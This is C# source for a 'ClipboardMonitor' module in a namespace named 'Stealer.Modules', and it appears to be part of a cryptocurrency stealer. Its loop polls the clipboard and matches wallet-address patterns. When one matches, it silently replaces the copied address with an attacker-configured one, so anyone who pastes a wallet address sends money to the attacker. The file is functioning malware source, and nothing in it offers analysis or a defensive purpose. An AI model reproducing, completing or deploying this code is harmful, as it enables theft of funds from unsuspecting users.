using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer.Modules
{
    internal sealed class ClipboardMonitor
    {
        // Previous clipboard content
        private static string previous_buffer = "";

        // Clipboard is changed
        private static bool clipboard_changed(string buffer)
        {
            if (buffer != previous_buffer)
            {
                previous_buffer = buffer;
                return true;
            }
            return false;
        }

        // Find & Replace crypto addresses in clipboard
        private static void replace_clipboard(string buffer)
        {
            if (string.IsNullOrEmpty(buffer))
                return;
            foreach (KeyValuePair<string, Regex> dictonary in RegexPatterns.patterns)
            {
                string cryptocurrency = dictonary.Key;
                Regex pattern = dictonary.Value;
                if (pattern.Match(buffer).Success)
                {
                    string replace_to = config.addresses[cryptocurrency];
                    if (!string.IsNullOrEmpty(replace_to) && !buffer.Equals(replace_to))
                    {
                        Clipboard.SetText(replace_to);
                        return;
                    }
                }
            }
        }

        // Run loop
        public static void run()
        {
            while (true)
            {
                string buffer = Clipboard.GetText();
                if (clipboard_changed(buffer))
                    replace_clipboard(buffer);
                System.Threading.Thread.Sleep(config.clipboard_check_delay * 1000);
            }
        }
    }
}
